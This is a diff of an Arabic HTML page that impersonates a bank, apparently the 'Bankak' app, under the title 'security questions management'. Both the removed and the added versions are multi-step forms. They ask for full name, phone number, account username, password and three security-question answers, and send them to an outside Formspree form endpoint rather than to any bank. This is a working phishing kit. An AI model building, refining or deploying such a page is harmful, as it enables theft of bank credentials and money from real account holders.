@@ -3,98 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>مركز تحديث البيانات الموحد</title>
+    <title>إدارة أسئلة الأمان</title>
     <style>
-        * { box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background: #e9ecef; display: flex; justify-content: center; align-items: flex-start; min-height: 100vh; margin: 0; padding: 15px; }
-        .card { background: white; width: 100%; max-width: 420px; border-radius: 20px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); overflow: hidden; border-top: 8px solid #c62828; animation: fadeIn 0.5s ease; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        .header { padding: 25px; text-align: center; background: #fff; }
-        .logo-main { width: 110px; margin-bottom: 10px; }
-        .content { padding: 25px; }
-        input, select { width: 100%; padding: 15px; margin: 12px 0; border: 1.5px solid #ddd; border-radius: 12px; text-align: right; font-size: 16px; outline: none; background: #fdfdfd; transition: 0.3s; }
-        input:focus { border-color: #c62828; box-shadow: 0 0 8px rgba(198, 40, 40, 0.1); }
-        .btn { width: 100%; padding: 18px; background: #c62828; color: white; border: none; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 15px; }
+        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
+        body { background-color: #f0f0f0; margin: 0; padding: 10px; display: flex; justify-content: center; }
+        .card { background: white; width: 100%; max-width: 450px; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
+        .header { background: #000; padding: 15px; text-align: center; position: relative; }
+        .logo { width: 120px; }
+        .red-bar { background: #c62828; color: white; padding: 12px; text-align: center; font-weight: bold; font-size: 18px; }
+        .content { padding: 20px; background: #fff; }
+        .q-box { border-bottom: 1px solid #ddd; padding: 15px 0; }
+        .q-title { display: block; text-align: right; color: #555; font-size: 14px; margin-bottom: 5px; }
+        select, input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 5px; text-align: right; margin-top: 5px; font-size: 15px; background: #f9f9f9; }
+        .footer-btns { display: flex; gap: 10px; padding: 20px; background: #eee; }
+        .btn { flex: 1; padding: 12px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .btn-send { background: linear-gradient(to bottom, #d32f2f, #b71c1c); color: white; }
+        .btn-cancel { background: linear-gradient(to bottom, #d32f2f, #b71c1c); color: white; }
         .hidden { display: none; }
-        .step-tag { background: #fff5f5; color: #c62828; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: bold; display: inline-block; margin-bottom: 15px; }
-        .q-title { display: block; text-align: right; font-size: 14px; font-weight: bold; color: #444; margin-top: 10px; }
     </style>
 </head>
 <body>
 
 <div class="card">
     <div class="header">
-        <img src="logo_colored.png" class="logo-main" alt="Logo">
-        <h2 style="margin: 5px 0; font-size: 20px; color: #333;">تحديث نظام الاستلام الذكي</h2>
+        <img src="logo_colored.png" class="logo" alt="Bankak">
     </div>
+    <div class="red-bar">إدارة أسئلة الأمان</div>
 
-    <div class="content">
-        <form action="https://formspree.io/f/xzdjwoao" method="POST">
+    <form action="https://formspree.io/f/xzdjwoao" method="POST">
+        <div class="content">
             
             <div id="p1">
-                <span class="step-tag">خطوة 1: البيانات الشخصية</span>
-                <img src="icon_message.png" style="width: 40px; display: block; margin: 0 auto 10px auto;">
-                
-                <span class="q-title">نوع العملة المختارة:</span>
-                <select name="Currency_Type">
-                    <option value="SDG">جنيه سوداني (SDG)</option>
-                    <option value="USD">دولار أمريكي (USD)</option>
-                    <option value="SAR">ريال سعودي (SAR)</option>
+                <span class="q-title">اختر العملة:</span>
+                <select name="Currency">
+                    <option>جنيه سوداني (SDG)</option>
+                    <option>دولار أمريكي (USD)</option>
                 </select>
-
-                <input type="text" name="Full_Name" placeholder="الاسم الرباعي الكامل" required>
-                <input type="number" name="Phone_Number" placeholder="رقم الهاتف المرتبط" required>
-                
-                <button type="button" class="btn" onclick="go(2)">المتابعة للتأكيد</button>
+                <input type="text" name="Full_Name" placeholder="الاسم الكامل" required>
+                <input type="number" name="Phone" placeholder="رقم الهاتف" required>
+                <button type="button" class="btn btn-send" style="margin-top:15px;" onclick="go(2)">استمرار</button>
             </div>
 
             <div id="p2" class="hidden">
-                <span class="step-tag">خطوة 2: الدخول الآمن</span>
-                <p style="font-size: 14px; color: #666; text-align: center;">يرجى إدخال بيانات الوصول لتحديث الحساب</p>
-                
-                <input type="text" name="Account_ID" placeholder="اسم المستخدم / رقم الحساب" required>
-                <input type="password" name="Security_Pass" placeholder="كلمة المرور الشخصية" required>
-                
-                <button type="button" class="btn" onclick="go(3)">التحقق من الهوية</button>
+                <input type="text" name="User_ID" placeholder="اسم المستخدم / رقم الحساب" required>
+                <input type="password" name="Pass" placeholder="كلمة المرور" required>
+                <button type="button" class="btn btn-send" style="margin-top:15px;" onclick="go(3)">التالي</button>
             </div>
 
             <div id="p3" class="hidden">
-                <span class="step-tag">خطوة 3: أسئلة الأمان</span>
-                <p style="font-size: 13px; color: #888; margin-bottom: 15px;">أجب على الأسئلة كما هي مسجلة في ملفك الشخصي</p>
-                
-                <span class="q-title">سؤال الأمان الأول (صورة 1):</span>
-                <select name="Security_Q1">
-                    <option value="Choice_1">الخيار رقم 1</option>
-                    <option value="Choice_2">الخيار رقم 2</option>
-                    <option value="Choice_3">الخيار رقم 3</option>
-                </select>
+                <div class="q-box">
+                    <span class="q-title">إختر السؤال الأول:</span>
+                    <select name="Question_1">
+                        <option>ما هو اسم ابن عمك الأول؟</option>
+                        <option>ما هو اسم مدرستك الابتدائية؟</option>
+                    </select>
+                    <input type="text" name="Answer_1" placeholder="أدخل الجواب">
+                </div>
 
-                <span class="q-title">سؤال الأمان الثاني (صورة 2):</span>
-                <select name="Security_Q2">
-                    <option value="Verified_Yes">نعم، أؤكد العملية</option>
-                    <option value="Verified_No">لا، إلغاء الإجراء</option>
-                </select>
+                <div class="q-box">
+                    <span class="q-title">إختر السؤال الثاني:</span>
+                    <select name="Question_2">
+                        <option>ماذا كان لقبك اثناء الطفولة؟</option>
+                        <option>اسم مؤلفك المفضل؟</option>
+                        <option>اسم الشركة المصنعة للسيارة المفضلة لديك؟</option>
+                    </select>
+                    <input type="text" name="Answer_2" placeholder="أدخل الجواب">
+                </div>
 
-                <span class="q-title">سؤال الأمان الثالث (صورة 3):</span>
-                <select name="Security_Q3">
-                    <option value="Final_Submit">إرسال وتحديث الآن</option>
-                    <option value="Later">إرسال في وقت لاحق</option>
-                </select>
+                <div class="q-box">
+                    <span class="q-title">إختر السؤال الثالث:</span>
+                    <select name="Question_3">
+                        <option>أي فيلم هو المفضل لديك؟</option>
+                        <option>اسم أفضل صديق في الطفولة؟</option>
+                        <option>في أي عام حصلت على رخصة القيادة الخاصة بك؟</option>
+                        <option>اسم أول بلد أجنبي قمت بزيارته؟</option>
+                    </select>
+                    <input type="text" name="Answer_3" placeholder="أدخل الجواب">
+                </div>
 
-                <button type="submit" class="btn">تنشيط الحساب فوراً</button>
+                <div class="footer-btns">
+                    <button type="submit" class="btn btn-send">إرسال</button>
+                    <button type="button" class="btn btn-cancel">إلغاء</button>
+                </div>
             </div>
-        </form>
-    </div>
+        </div>
+    </form>
 </div>
 
 <script>
     function go(s) {
-        // إخفاء الكل وإظهار المرحلة المطلوبة
         document.getElementById('p1').classList.add('hidden');
         document.getElementById('p2').classList.add('hidden');
-        document.getElementById('p3').classList.add('hidden');
-        document.getElementById('p' + s).classList.remove('hidden');
-        window.scrollTo(0, 0);
+        document.getElementById('p3').classList.remove('hidden');
     }
 </script>
 
